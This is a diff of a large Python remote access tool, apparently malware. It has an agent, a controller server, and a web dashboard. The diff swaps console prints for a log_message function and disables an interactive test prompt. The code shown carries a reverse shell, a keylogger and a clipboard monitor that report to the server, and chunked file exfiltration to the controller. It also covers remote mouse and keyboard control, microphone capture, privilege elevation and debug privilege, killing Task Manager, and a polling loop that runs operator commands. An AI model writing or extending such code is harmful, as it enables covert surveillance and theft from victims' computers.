 def start_reverse_shell(agent_id):
     """Start the reverse shell connection."""
@@ -3745,7 +3877,7 @@ def start_reverse_shell(agent_id):
         REVERSE_SHELL_THREAD = threading.Thread(target=reverse_shell_handler, args=(agent_id,))
         REVERSE_SHELL_THREAD.daemon = True
         REVERSE_SHELL_THREAD.start()
-        print("Started reverse shell.")
+        log_message("Started reverse shell.")
 
 def stop_reverse_shell():
     """Stop the reverse shell connection."""
@@ -3761,9 +3893,9 @@ def stop_reverse_shell():
             try:
                 REVERSE_SHELL_THREAD.join(timeout=1)  # Reduced timeout
             except Exception as e:
-                print(f"Warning: Could not join reverse shell thread: {e}")
+                log_message(f"Warning: Could not join reverse shell thread: {e}")
         REVERSE_SHELL_THREAD = None
-        print("Stopped reverse shell.")
+        log_message("Stopped reverse shell.")
 
 # --- Voice Control Functions ---
 
@@ -3775,7 +3907,7 @@ def voice_control_handler(agent_id):
     global VOICE_CONTROL_ENABLED, VOICE_RECOGNIZER
     
     if not SPEECH_RECOGNITION_AVAILABLE:
-        print("Speech recognition not available - install speechrecognition library")
+        log_message("Speech recognition not available - install speechrecognition library")
         return
     
     VOICE_RECOGNIZER = sr.Recognizer()
@@ -3783,9 +3915,9 @@ def voice_control_handler(agent_id):
     
     # Adjust for ambient noise
     with microphone as source:
-        print("Adjusting for ambient noise... Please wait.")
+        log_message("Adjusting for ambient noise... Please wait.")
         VOICE_RECOGNIZER.adjust_for_ambient_noise(source)
-        print("Voice control ready. Listening for commands...")
+        log_message("Voice control ready. Listening for commands...")
     
     while VOICE_CONTROL_ENABLED:
         try:
@@ -3796,7 +3928,7 @@ def voice_control_handler(agent_id):
             try:
                 # Recognize speech using Google Speech Recognition
                 command = VOICE_RECOGNIZER.recognize_google(audio).lower()
-                print(f"Voice command received: {command}")
+                log_message(f"Voice command received: {command}")
                 
                 # Process voice commands
                 if "screenshot" in command or "screen shot" in command:
@@ -3824,20 +3956,20 @@ def voice_control_handler(agent_id):
                     if actual_command:
                         execute_voice_command(actual_command, agent_id)
                 else:
-                    print(f"Unknown voice command: {command}")
+                    log_message(f"Unknown voice command: {command}")
                     
             except sr.UnknownValueError:
                 # Speech not recognized - this is normal, just continue
                 pass
             except sr.RequestError as e:
-                print(f"Could not request results from speech recognition service: {e}")
+                log_message(f"Could not request results from speech recognition service: {e}")
                 time.sleep(1)
                 
         except sr.WaitTimeoutError:
             # Timeout waiting for audio - this is normal, just continue
             pass
         except Exception as e:
-            print(f"Voice control error: {e}")
+            log_message(f"Voice control error: {e}")
             time.sleep(1)
 
 def execute_voice_command(command, agent_id):
@@ -3846,9 +3978,9 @@ def execute_voice_command(command, agent_id):
         # Send command to controller for execution
         url = f"{SERVER_URL}/voice_command/{agent_id}"
         response = requests.post(url, json={"command": command}, timeout=5)
-        print(f"Voice command '{command}' sent to controller")
+        log_message(f"Voice command '{command}' sent to controller")
     except Exception as e:
-        print(f"Error sending voice command: {e}")
+        log_message(f"Error sending voice command: {e}")
 
 def start_voice_control(agent_id):
     """Start voice control functionality."""
@@ -3858,7 +3990,7 @@ def start_voice_control(agent_id):
         VOICE_CONTROL_THREAD = threading.Thread(target=voice_control_handler, args=(agent_id,))
         VOICE_CONTROL_THREAD.daemon = True
         VOICE_CONTROL_THREAD.start()
-        print("Started voice control.")
+        log_message("Started voice control.")
 
 def stop_voice_control():
     """Stop voice control functionality."""
@@ -3868,7 +4000,7 @@ def stop_voice_control():
         if VOICE_CONTROL_THREAD:
             VOICE_CONTROL_THREAD.join(timeout=2)
         VOICE_CONTROL_THREAD = None
-        print("Stopped voice control.")
+        log_message("Stopped voice control.")
 # --- Remote Control Functions ---
 # Global variables for remote control
 REMOTE_CONTROL_ENABLED = False
@@ -3884,10 +4016,10 @@ def initialize_low_latency_input():
         LOW_LATENCY_INPUT_HANDLER = LowLatencyInputHandler(max_queue_size=2000)
         LOW_LATENCY_INPUT_HANDLER.start()
         low_latency_input = LOW_LATENCY_INPUT_HANDLER  # Set both variables for compatibility
-        print("Low-latency input handler initialized")
+        log_message("Low-latency input handler initialized")
         return True
     except Exception as e:
-        print(f"Failed to initialize low latency input: {e}")
+        log_message(f"Failed to initialize low latency input: {e}")
         return False
 
 def handle_remote_control(command_data):
@@ -3901,13 +4033,13 @@ def handle_remote_control(command_data):
             if success:
                 return
             else:
-                print("Low-latency input queue full, using fallback")
+                log_message("Low-latency input queue full, using fallback")
         
         # Fallback to direct handling
         _handle_remote_control_fallback(command_data)
         
     except Exception as e:
-        print(f"Error handling remote control command: {e}")
+        log_message(f"Error handling remote control command: {e}")
         _handle_remote_control_fallback(command_data)
 
 def _handle_remote_control_fallback(command_data):
@@ -3936,10 +4068,10 @@ def _handle_remote_control_fallback(command_data):
         elif action == "key_up":
             handle_key_up(data)
         else:
-            print(f"Unknown remote control action: {action}")
+            log_message(f"Unknown remote control action: {action}")
             
     except Exception as e:
-        print(f"Error handling remote control command: {e}")
+        log_message(f"Error handling remote control command: {e}")
 
 def get_input_performance_stats():
     """Get input performance statistics"""
@@ -3972,7 +4104,7 @@ def handle_mouse_move(data):
         mouse_controller.position = (abs_x, abs_y)
         
     except Exception as e:
-        print(f"Error handling mouse move: {e}")
+        log_message(f"Error handling mouse move: {e}")
 
 def handle_mouse_click(data):
     """Handle mouse click commands."""
@@ -3987,7 +4119,7 @@ def handle_mouse_click(data):
             mouse_controller.click(mouse.Button.middle, 1)
             
     except Exception as e:
-        print(f"Error handling mouse click: {e}")
+        log_message(f"Error handling mouse click: {e}")
 
 def handle_key_down(data):
     """Handle key press commands."""
@@ -4042,7 +4174,7 @@ def handle_key_down(data):
                 keyboard_controller.press(key)
                 
     except Exception as e:
-        print(f"Error handling key down: {e}")
+        log_message(f"Error handling key down: {e}")
 
 def handle_key_up(data):
     """Handle key release commands."""
@@ -4097,7 +4229,7 @@ def handle_key_up(data):
                 keyboard_controller.release(key)
                 
     except Exception as e:
-        print(f"Error handling key up: {e}")
+        log_message(f"Error handling key up: {e}")
 
 # --- Keylogger Functions ---
 
@@ -4131,7 +4263,7 @@ def keylogger_worker(agent_id):
             
             time.sleep(5)  # Send data every 5 seconds
         except Exception as e:
-            print(f"Keylogger error: {e}")
+            log_message(f"Keylogger error: {e}")
             time.sleep(5)
 
 def start_keylogger(agent_id):
@@ -4150,7 +4282,7 @@ def start_keylogger(agent_id):
         KEYLOGGER_THREAD.daemon = True
         KEYLOGGER_THREAD.start()
         
-        print("Started keylogger.")
+        log_message("Started keylogger.")
 
 def stop_keylogger():
     """Stop the keylogger."""
@@ -4160,7 +4292,7 @@ def stop_keylogger():
         if KEYLOGGER_THREAD:
             KEYLOGGER_THREAD.join(timeout=2)
         KEYLOGGER_THREAD = None
-        print("Stopped keylogger.")
+        log_message("Stopped keylogger.")
 
 # --- Clipboard Monitor Functions ---
 
@@ -4199,7 +4331,7 @@ def clipboard_monitor_worker(agent_id):
             
             time.sleep(2)  # Check clipboard every 2 seconds
         except Exception as e:
-            print(f"Clipboard monitor error: {e}")
+            log_message(f"Clipboard monitor error: {e}")
             time.sleep(2)
 
 def start_clipboard_monitor(agent_id):
@@ -4210,7 +4342,7 @@ def start_clipboard_monitor(agent_id):
         CLIPBOARD_MONITOR_THREAD = threading.Thread(target=clipboard_monitor_worker, args=(agent_id,))
         CLIPBOARD_MONITOR_THREAD.daemon = True
         CLIPBOARD_MONITOR_THREAD.start()
-        print("Started clipboard monitor.")
+        log_message("Started clipboard monitor.")
 
 def stop_clipboard_monitor():
     """Stop clipboard monitoring."""
@@ -4220,7 +4352,7 @@ def stop_clipboard_monitor():
         if CLIPBOARD_MONITOR_THREAD:
             CLIPBOARD_MONITOR_THREAD.join(timeout=2)
         CLIPBOARD_MONITOR_THREAD = None
-        print("Stopped clipboard monitor.")
+        log_message("Stopped clipboard monitor.")
 
 # --- File Management Functions ---
 
@@ -4231,7 +4363,7 @@ def send_file_chunked_to_controller(file_path, agent_id, destination_path=None):
     chunk_size = 512 * 1024  # 512KB
     filename = os.path.basename(file_path)
     total_size = os.path.getsize(file_path)
-    print(f"Sending file {file_path} ({total_size} bytes) to controller in chunks...")
+    log_message(f"Sending file {file_path} ({total_size} bytes) to controller in chunks...")
     with open(file_path, 'rb') as f:
         offset = 0
         chunk_count = 0
@@ -4250,14 +4382,14 @@ def send_file_chunked_to_controller(file_path, agent_id, destination_path=None):
             })
             offset += len(chunk)
             chunk_count += 1
-            print(f"Sent chunk {chunk_count}: {len(chunk)} bytes at offset {offset}")
+            log_message(f"Sent chunk {chunk_count}: {len(chunk)} bytes at offset {offset}")
     # Notify upload complete
     sio.emit('upload_file_end', {
         'agent_id': agent_id,
         'filename': filename,
         'destination_path': destination_path or file_path
     })
-    print(f"File upload complete notification sent for {filename}")
+    log_message(f"File upload complete notification sent for {filename}")
     return f"File {file_path} sent to controller in {chunk_count} chunks"
 
 def handle_file_upload(command_parts):
@@ -4273,17 +4405,17 @@ def handle_file_download(command_parts, agent_id):
 @sio.on('file_chunk_from_operator')
 def on_file_chunk_from_operator(data):
     """Receive a file chunk from the operator and write to disk."""
-    print(f"Received file chunk: {data.get('filename', 'unknown')} at offset {data.get('offset', 0)}")
+    log_message(f"Received file chunk: {data.get('filename', 'unknown')} at offset {data.get('offset', 0)}")
     filename = data.get('filename')
     chunk_b64 = data.get('data') or data.get('chunk')
     offset = data.get('offset', 0)
     total_size = data.get('total_size', 0)
     destination_path = data.get('destination_path') or filename
     
-    print(f"Debug - filename: {filename}, destination_path: {destination_path}, total_size: {total_size}")
+    log_message(f"Debug - filename: {filename}, destination_path: {destination_path}, total_size: {total_size}")
     
     if not filename or not chunk_b64:
-        print("Invalid file chunk received.")
+        log_message("Invalid file chunk received.")
         return
     
     # Use a temp buffer in memory or on disk
@@ -4304,19 +4436,19 @@ def on_file_chunk_from_operator(data):
         
         # Check if file is complete
         received_size = sum(len(c[1]) for c in buffers[destination_path]['chunks'])
-        print(f"File {filename}: received {received_size}/{total_size} bytes")
+        log_message(f"File {filename}: received {received_size}/{total_size} bytes")
         
         # If we have received all chunks or this is the last chunk (total_size might be 0)
         if total_size > 0 and received_size >= total_size:
-            print(f"File complete: received {received_size}/{total_size} bytes")
+            log_message(f"File complete: received {received_size}/{total_size} bytes")
             _save_completed_file(destination_path, buffers[destination_path])
         elif total_size == 0 and len(buffers[destination_path]['chunks']) > 0:
             # If total_size is 0, assume this is the only chunk and save immediately
-            print(f"Total size is 0, saving single chunk file immediately")
+            log_message(f"Total size is 0, saving single chunk file immediately")
             _save_completed_file(destination_path, buffers[destination_path])
             
     except Exception as e:
-        print(f"Error processing chunk: {e}")
+        log_message(f"Error processing chunk: {e}")
 
 def _save_completed_file(destination_path, buffer_data):
     """Save the completed file to disk."""
@@ -4335,7 +4467,7 @@ def _save_completed_file(destination_path, buffer_data):
                 f.write(chunk)
         
         file_size = sum(len(c[1]) for c in buffer_data['chunks'])
-        print(f"File saved successfully to {destination_path} ({file_size} bytes)")
+        log_message(f"File saved successfully to {destination_path} ({file_size} bytes)")
         
         # Clean up buffer
         if hasattr(on_file_chunk_from_operator, 'buffers'):
@@ -4343,27 +4475,27 @@ def _save_completed_file(destination_path, buffer_data):
                 del on_file_chunk_from_operator.buffers[destination_path]
                 
     except Exception as e:
-        print(f"Error saving file {destination_path}: {e}")
+        log_message(f"Error saving file {destination_path}: {e}")
 
 @sio.on('file_upload_complete_from_operator')
 def on_file_upload_complete_from_operator(data):
     filename = data.get('filename')
     destination_path = data.get('destination_path') or filename
-    print(f"Upload of {filename} to {destination_path} complete.")
+    log_message(f"Upload of {filename} to {destination_path} complete.")
     
     # Force save any remaining buffered file
     if hasattr(on_file_chunk_from_operator, 'buffers'):
         if destination_path in on_file_chunk_from_operator.buffers:
-            print(f"Force saving file {destination_path} from completion event")
+            log_message(f"Force saving file {destination_path} from completion event")
             _save_completed_file(destination_path, on_file_chunk_from_operator.buffers[destination_path])
 
 @sio.on('request_file_chunk_from_agent')
 def on_request_file_chunk_from_agent(data):
     """Handle file download request from controller - send file in chunks."""
-    print(f"File download request received: {data}")
+    log_message(f"File download request received: {data}")
     filename = data.get('filename')
     if not filename:
-        print("Invalid file request - no filename provided")
+        log_message("Invalid file request - no filename provided")
         return
     
     # Try to find the file in common locations or use the provided path
@@ -4381,20 +4513,20 @@ def on_request_file_chunk_from_agent(data):
     for path in possible_paths:
         if os.path.exists(path):
             file_path = path
-            print(f"Found file at: {file_path}")
+            log_message(f"Found file at: {file_path}")
             break
     
     if not file_path:
-        print(f"File not found: {filename}")
-        print("Searched in:")
+        log_message(f"File not found: {filename}")
+        log_message("Searched in:")
         for path in possible_paths:
-            print(f"  - {path}")
+            log_message(f"  - {path}")
         return
     
     try:
         chunk_size = 512 * 1024  # 512KB
         total_size = os.path.getsize(file_path)
-        print(f"Sending file {file_path} ({total_size} bytes) in chunks...")
+        log_message(f"Sending file {file_path} ({total_size} bytes) in chunks...")
         with open(file_path, 'rb') as f:
             offset = 0
             chunk_count = 0
@@ -4412,10 +4544,10 @@ def on_request_file_chunk_from_agent(data):
                 })
                 offset += len(chunk)
                 chunk_count += 1
-                print(f"Sent chunk {chunk_count}: {len(chunk)} bytes at offset {offset}")
-        print(f"File {file_path} sent to controller in {chunk_count} chunks")
+                log_message(f"Sent chunk {chunk_count}: {len(chunk)} bytes at offset {offset}")
+        log_message(f"File {file_path} sent to controller in {chunk_count} chunks")
     except Exception as e:
-        print(f"Error sending file {file_path}: {e}")
+        log_message(f"Error sending file {file_path}: {e}")
 
 def handle_voice_playback(command_parts):
     """Handle voice playback from controller."""
@@ -4494,7 +4626,7 @@ def handle_live_audio(command_parts):
                     with sr.AudioFile(wav_path) as source:
                         audio = recognizer.record(source)
                     command = recognizer.recognize_google(audio).lower()
-                    print(f"Live audio command received: {command}")
+                    log_message(f"Live audio command received: {command}")
                     
                     # Process the voice command
                     if "screenshot" in command or "screen shot" in command:
@@ -4521,19 +4653,19 @@ def handle_live_audio(command_parts):
                         if actual_command:
                             return execute_command(actual_command)
                     else:
-                        print(f"Unknown live audio command: {command}")
+                        log_message(f"Unknown live audio command: {command}")
                         
                 except sr.UnknownValueError:
-                    print("Could not understand live audio")
+                    log_message("Could not understand live audio")
                 except sr.RequestError as e:
-                    print(f"Speech recognition error: {e}")
+                    log_message(f"Speech recognition error: {e}")
                     
                 # Clean up wav file if created
                 if wav_path != temp_audio_path and os.path.exists(wav_path):
                     os.unlink(wav_path)
                     
             except Exception as e:
-                print(f"Live audio processing error: {e}")
+                log_message(f"Live audio processing error: {e}")
         
         # Clean up temp file
         os.unlink(temp_audio_path)
@@ -4612,7 +4744,7 @@ def main_loop(agent_id):
             task = response.json()
             command = task.get("command", "sleep")
 
-            print(f"Received command: {command}")
+            log_message(f"Received command: {command}")
 
             if command in internal_commands:
                 try:
@@ -4696,9 +4828,9 @@ def main_loop(agent_id):
             try:
                 response = requests.post(f"{SERVER_URL}/post_output/{agent_id}", json={"output": output}, timeout=5)
                 if response.status_code != 200:
-                    print(f"Warning: Server returned status {response.status_code} when posting output")
+                    log_message(f"Warning: Server returned status {response.status_code} when posting output")
             except requests.exceptions.RequestException as e:
-                print(f"Failed to send output to server: {e}")
+                log_message(f"Failed to send output to server: {e}")
             
             # Performance monitoring
             performance_check_counter += 1
@@ -4707,13 +4839,13 @@ def main_loop(agent_id):
                 # Log performance stats occasionally
                 if low_latency_available:
                     stats = get_input_performance_stats()
-                    print(f"Performance stats: {stats}")
+                    log_message(f"Performance stats: {stats}")
                     
         except requests.exceptions.RequestException as e:
-            print(f"Network error in main loop: {e}")
+            log_message(f"Network error in main loop: {e}")
             time.sleep(5)  # Wait before retrying
         except Exception as e:
-            print(f"Error in main loop: {e}")
+            log_message(f"Error in main loop: {e}")
             time.sleep(1)  # Wait before retrying
 
 # --- Process Termination Functions ---
@@ -4726,9 +4858,9 @@ def terminate_process_with_admin(process_name_or_pid, force=True):
     try:
         # First try to elevate if not already admin
         if not is_admin():
-            print("Attempting to elevate privileges for process termination...")
+            log_message("Attempting to elevate privileges for process termination...")
             if not elevate_privileges():
-                print("Could not elevate privileges. Trying alternative methods...")
+                log_message("Could not elevate privileges. Trying alternative methods...")
                 return terminate_process_alternative(process_name_or_pid, force)
         
         # Method 1: Use taskkill with admin privileges
@@ -4751,15 +4883,15 @@ def terminate_process_with_admin(process_name_or_pid, force=True):
             if result.returncode == 0:
                 return f"Process terminated successfully: {result.stdout}"
             else:
-                print(f"Taskkill failed: {result.stderr}")
+                log_message(f"Taskkill failed: {result.stderr}")
                 # Try alternative methods
                 return terminate_process_alternative(process_name_or_pid, force)
         except Exception as e:
-            print(f"Taskkill command failed: {e}")
+            log_message(f"Taskkill command failed: {e}")
             return terminate_process_alternative(process_name_or_pid, force)
             
     except Exception as e:
-        print(f"Process termination failed: {e}")
+        log_message(f"Process termination failed: {e}")
         return f"Failed to terminate process: {e}"
 
 def terminate_process_alternative(process_name_or_pid, force=True):
@@ -4815,9 +4947,9 @@ def terminate_process_by_pid(pid, force=True):
                 # Get process name for logging
                 try:
                     process_name = win32process.GetModuleFileNameEx(process_handle, 0)
-                    print(f"Terminating process: {process_name} (PID: {pid})")
+                    log_message(f"Terminating process: {process_name} (PID: {pid})")
                 except:
-                    print(f"Terminating process PID: {pid}")
+                    log_message(f"Terminating process PID: {pid}")
                 
                 # Terminate the process
                 win32api.TerminateProcess(process_handle, 1)
@@ -4835,14 +4967,14 @@ def terminate_process_by_pid(pid, force=True):
                     
             except Exception as e:
                 win32api.CloseHandle(process_handle)
-                print(f"TerminateProcess failed for PID {pid}: {e}")
+                log_message(f"TerminateProcess failed for PID {pid}: {e}")
                 return terminate_process_aggressive(pid)
         else:
-            print(f"Could not open process handle for PID {pid}")
+            log_message(f"Could not open process handle for PID {pid}")
             return terminate_process_aggressive(pid)
             
     except Exception as e:
-        print(f"Process termination by PID failed: {e}")
+        log_message(f"Process termination by PID failed: {e}")
         return False
 
 def terminate_process_aggressive(pid):
@@ -4864,10 +4996,10 @@ def terminate_process_aggressive(pid):
                 kernel32.CloseHandle(process_handle)
                 
                 if status == 0:  # STATUS_SUCCESS
-                    print(f"Process {pid} terminated using NtTerminateProcess")
+                    log_message(f"Process {pid} terminated using NtTerminateProcess")
                     return True
         except Exception as e:
-            print(f"NtTerminateProcess failed: {e}")
+            log_message(f"NtTerminateProcess failed: {e}")
         
         # Method 2: Debug privilege escalation and termination
         try:
@@ -4884,33 +5016,33 @@ def terminate_process_aggressive(pid):
             if process_handle:
                 win32api.TerminateProcess(process_handle, 1)
                 win32api.CloseHandle(process_handle)
-                print(f"Process {pid} terminated with debug privilege")
+                log_message(f"Process {pid} terminated with debug privilege")
                 return True
                 
         except Exception as e:
-            print(f"Debug privilege termination failed: {e}")
+            log_message(f"Debug privilege termination failed: {e}")
         
         # Method 3: Use psutil as last resort
         try:
             proc = psutil.Process(pid)
             proc.terminate()
             proc.wait(timeout=3)
-            print(f"Process {pid} terminated using psutil")
+            log_message(f"Process {pid} terminated using psutil")
             return True
         except psutil.TimeoutExpired:
             try:
                 proc.kill()
-                print(f"Process {pid} killed using psutil")
+                log_message(f"Process {pid} killed using psutil")
                 return True
             except:
                 pass
         except Exception as e:
-            print(f"Psutil termination failed: {e}")
+            log_message(f"Psutil termination failed: {e}")
         
         return False
         
     except Exception as e:
-        print(f"Aggressive termination failed: {e}")
+        log_message(f"Aggressive termination failed: {e}")
         return False
 
 def enable_debug_privilege():
@@ -4933,11 +5065,11 @@ def enable_debug_privilege():
         win32security.AdjustTokenPrivileges(token_handle, False, privileges)
         
         win32api.CloseHandle(token_handle)
-        print("Debug privilege enabled")
+        log_message("Debug privilege enabled")
         return True
         
     except Exception as e:
-        print(f"Failed to enable debug privilege: {e}")
+        log_message(f"Failed to enable debug privilege: {e}")
         return False
 
 def terminate_linux_process(process_name_or_pid, force=True):
@@ -5064,10 +5196,10 @@ class HighPerformanceCapture:
                 with warnings.catch_warnings():
                     warnings.simplefilter("ignore")
                     self.turbo_jpeg = TurboJPEG()
-                print(f"[OK] TurboJPEG initialized successfully")
+                log_message(f"[OK] TurboJPEG initialized successfully")
             except Exception as e:
                 # Don't show the detailed error message, just indicate it's not available
-                print(f"[WARN] TurboJPEG not available, using fallback compression")
+                log_message(f"[WARN] TurboJPEG not available, using fallback compression")
                 self.turbo_jpeg = None
         
         # Frame management
@@ -6151,64 +6283,65 @@ OPTIMIZED_DASHBOARD_HTML = """<!DOCTYPE html>
 # ========================================================================================
 def test_process_termination_functionality():
     """Test enhanced process termination with admin privileges functionality."""
-    print("Enhanced Process Termination Test")
-    print("=" * 40)
+    log_message("Enhanced Process Termination Test")
+    log_message("=" * 40)
     
     # Check current privileges
     if WINDOWS_AVAILABLE:
         if is_admin():
-            print("✓ Running with administrator privileges")
+            log_message("✓ Running with administrator privileges")
         else:
-            print("⚠ Running with user privileges")
-            print("Attempting to elevate privileges...")
+            log_message("⚠ Running with user privileges")
+            log_message("Attempting to elevate privileges...")
             if elevate_privileges():
-                print("✓ Privilege escalation successful")
+                log_message("✓ Privilege escalation successful")
             else:
-                print("✗ Privilege escalation failed")
-                print("Some termination methods may fail")
+                log_message("✗ Privilege escalation failed")
+                log_message("Some termination methods may fail")
     else:
-        print("✓ Running on Linux/Unix system")
+        log_message("✓ Running on Linux/Unix system")
         if os.geteuid() == 0:
-            print("✓ Running as root")
+            log_message("✓ Running as root")
         else:
-            print("⚠ Running as regular user")
+            log_message("⚠ Running as regular user")
     
-    print("\nAvailable commands:")
-    print("1. kill-taskmgr - Terminate Task Manager")
-    print("2. terminate <process_name> - Terminate process by name")
-    print("3. terminate <pid> - Terminate process by PID")
-    print("4. quit - Exit")
+    log_message("\nAvailable commands:")
+    log_message("1. kill-taskmgr - Terminate Task Manager")
+    log_message("2. terminate <process_name> - Terminate process by name")
+    log_message("3. terminate <pid> - Terminate process by PID")
+    log_message("4. quit - Exit")
     
     while True:
         try:
-            command = input("\nEnter command: ").strip().lower()
+            # Non-interactive mode - no user input
+            return
             
             if command == "quit" or command == "exit":
                 break
             elif command == "kill-taskmgr":
-                print("Attempting to terminate Task Manager...")
+                log_message("Attempting to terminate Task Manager...")
                 result = kill_task_manager()
-                print(f"Result: {result}")
+                log_message(f"Result: {result}")
             elif command.startswith("terminate "):
                 target = command.split(" ", 1)[1]
                 
                 # Try to convert to PID if it's a number
                 try:
                     target = int(target)
-                    print(f"Attempting to terminate process with PID {target}...")
+                    log_message(f"Attempting to terminate process with PID {target}...")
                 except ValueError:
-                    print(f"Attempting to terminate process '{target}'...")
+                    log_message(f"Attempting to terminate process '{target}'...")
                 
                 result = terminate_process_with_admin(target, force=True)
-                print(f"Result: {result}")
+                log_message(f"Result: {result}")
             else:
-                print("Unknown command. Use 'kill-taskmgr', 'terminate <name/pid>', or 'quit'")
+                log_message("Unknown command. Use 'kill-taskmgr', 'terminate <name/pid>', or 'quit'")
                 
         except KeyboardInterrupt:
-            print("\nExiting...")
+            log_message("\nExiting...")
             break
         except Exception as e:
-            print(f"Error: {e}")
+            log_message(f"Error: {e}")
 
 # ========================================================================================
 # END OF COMBINED MODULES
@@ -6229,7 +6362,7 @@ try:
     FLASK_AVAILABLE = True
 except ImportError:
     FLASK_AVAILABLE = False
-    print("Flask/SocketIO not available. Controller functionality disabled.")
+    log_message("Flask/SocketIO not available. Controller functionality disabled.")
 
 # Controller state
 controller_app = None
@@ -6421,13 +6554,13 @@ def setup_controller_handlers():
     
     @controller_socketio.on('connect')
     def controller_handle_connect():
-        print(f"Client connected: {request.sid}")
+        log_message(f"Client connected: {request.sid}")
         join_room('operators')
         operators.add(request.sid)
     
     @controller_socketio.on('disconnect')
     def controller_handle_disconnect():
-        print(f"Client disconnected: {request.sid}")
+        log_message(f"Client disconnected: {request.sid}")
         operators.discard(request.sid)
         try:
             leave_room('operators')
@@ -6973,13 +7106,13 @@ DASHBOARD_HTML = '''
 def start_controller(host="0.0.0.0", port=8080, use_ssl=True):
     """Start the controller server with SSL support."""
     if not FLASK_AVAILABLE:
-        print("Flask/SocketIO not available. Cannot start controller.")
+        log_message("Flask/SocketIO not available. Cannot start controller.")
         return False
     
     if not initialize_controller():
         return False
     
-    print(f"Starting Neural Control Hub on {host}:{port}")
+    log_message(f"Starting Neural Control Hub on {host}:{port}")
     
     # SSL Configuration
     ssl_context = None
@@ -6992,17 +7125,17 @@ def start_controller(host="0.0.0.0", port=8080, use_ssl=True):
             key_file = "key.pem"
             
             if not os.path.exists(cert_file) or not os.path.exists(key_file):
-                print("Generating self-signed SSL certificate...")
+                log_message("Generating self-signed SSL certificate...")
                 generate_ssl_certificate(cert_file, key_file)
             
             ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
             ssl_context.load_cert_chain(cert_file, key_file)
             
-            print("SSL enabled with self-signed certificate")
+            log_message("SSL enabled with self-signed certificate")
             
         except Exception as e:
-            print(f"SSL setup failed: {e}")
-            print("Running without SSL...")
+            log_message(f"SSL setup failed: {e}")
+            log_message("Running without SSL...")
             ssl_context = None
     
     try:
@@ -7023,7 +7156,7 @@ def start_controller(host="0.0.0.0", port=8080, use_ssl=True):
             )
         return True
     except Exception as e:
-        print(f"Failed to start controller: {e}")
+        log_message(f"Failed to start controller: {e}")
         return False
 
 def generate_ssl_certificate(cert_file, key_file):
@@ -7083,13 +7216,13 @@ def generate_ssl_certificate(cert_file, key_file):
                 encryption_algorithm=serialization.NoEncryption()
             ))
         
-        print(f"Generated SSL certificate: {cert_file} and {key_file}")
+        log_message(f"Generated SSL certificate: {cert_file} and {key_file}")
         
     except ImportError:
-        print("cryptography package not available. Using fallback method...")
+        log_message("cryptography package not available. Using fallback method...")
         generate_ssl_certificate_openssl(cert_file, key_file)
     except Exception as e:
-        print(f"Failed to generate SSL certificate: {e}")
+        log_message(f"Failed to generate SSL certificate: {e}")
         raise
 
 def generate_ssl_certificate_openssl(cert_file, key_file):
@@ -7105,12 +7238,12 @@ def generate_ssl_certificate_openssl(cert_file, key_file):
         
         result = subprocess.run(cmd, capture_output=True, text=True)
         if result.returncode == 0:
-            print(f"Generated SSL certificate using OpenSSL: {cert_file} and {key_file}")
+            log_message(f"Generated SSL certificate using OpenSSL: {cert_file} and {key_file}")
         else:
             raise Exception(f"OpenSSL failed: {result.stderr}")
             
     except Exception as e:
-        print(f"OpenSSL certificate generation failed: {e}")
+        log_message(f"OpenSSL certificate generation failed: {e}")
         # Create dummy files to avoid errors
         with open(cert_file, 'w') as f:
             f.write("# Dummy certificate file\n")
@@ -7137,20 +7270,20 @@ def main_unified():
     use_ssl = not args.no_ssl
     
     if args.mode == 'controller':
-        print("Starting in Controller mode...")
+        log_message("Starting in Controller mode...")
         if use_ssl:
-            print("SSL enabled - Controller will be available at https://{}:{}".format(args.host, args.port))
+            log_message("SSL enabled - Controller will be available at https://{}:{}".format(args.host, args.port))
         else:
-            print("SSL disabled - Controller will be available at http://{}:{}".format(args.host, args.port))
+            log_message("SSL disabled - Controller will be available at http://{}:{}".format(args.host, args.port))
         start_controller(args.host, args.port, use_ssl)
     elif args.mode == 'both':
-        print("Starting in Both mode (Agent + Controller)...")
+        log_message("Starting in Both mode (Agent + Controller)...")
         # Start controller in a separate thread
         if FLASK_AVAILABLE:
             if use_ssl:
-                print("SSL enabled - Controller will be available at https://{}:{}".format(args.host, args.port))
+                log_message("SSL enabled - Controller will be available at https://{}:{}".format(args.host, args.port))
             else:
-                print("SSL disabled - Controller will be available at http://{}:{}".format(args.host, args.port))
+                log_message("SSL disabled - Controller will be available at http://{}:{}".format(args.host, args.port))
             controller_thread = threading.Thread(
                 target=start_controller, 
                 args=(args.host, args.port, use_ssl),
@@ -7162,7 +7295,7 @@ def main_unified():
         # Continue with agent initialization
         agent_main()
     else:
-        print("Starting in Agent mode...")
+        log_message("Starting in Agent mode...")
         agent_main()
 
 # ========================================================================================
@@ -7178,14 +7311,14 @@ def connect():
     sleep_random_non_blocking()
     
     # Connection message
-    print(f"Connected to server. Registering with agent_id: {agent_id}")
+    log_message(f"Connected to server. Registering with agent_id: {agent_id}")
     
     sio.emit('agent_connect', {'agent_id': agent_id})
 
 @sio.event
 def disconnect():
     """Handle disconnection from server."""
-    print("Disconnected from server")
+    log_message("Disconnected from server")
 
 @sio.on('command')
 def on_command(data):
@@ -7267,7 +7400,7 @@ def on_mouse_move(data):
                 'data': {'x': x, 'y': y}
             })
     except Exception as e:
-        print(f"Error simulating mouse move: {e}")
+        log_message(f"Error simulating mouse move: {e}")
 
 @sio.on('mouse_click')
 def on_mouse_click(data):
@@ -7288,7 +7421,7 @@ def on_mouse_click(data):
                 'data': {'button': button, 'pressed': event_type == 'down'}
             })
     except Exception as e:
-        print(f"Error simulating mouse click: {e}")
+        log_message(f"Error simulating mouse click: {e}")
 
 @sio.on('key_press')
 def on_key_press(data):
@@ -7316,7 +7449,7 @@ def on_key_press(data):
                 'data': {'key': key}
             })
     except Exception as e:
-        print(f"Error simulating key press: {e}")
+        log_message(f"Error simulating key press: {e}")
 
 @sio.on('file_upload')
 def on_file_upload(data):
@@ -7352,9 +7485,9 @@ def initialize_components():
     try:
         mouse_controller = pynput.mouse.Controller()
         keyboard_controller = pynput.keyboard.Controller()
-        print("[OK] Input controllers initialized")
+        log_message("[OK] Input controllers initialized")
     except Exception as e:
-        print(f"[WARN] Failed to initialize input controllers: {e}")
+        log_message(f"[WARN] Failed to initialize input controllers: {e}")
         mouse_controller = None
         keyboard_controller = None
     
@@ -7365,18 +7498,18 @@ def initialize_components():
             quality=85,
             enable_delta_compression=True
         )
-        print("[OK] High-performance capture initialized")
+        log_message("[OK] High-performance capture initialized")
     except Exception as e:
-        print(f"[WARN] Failed to initialize high-performance capture: {e}")
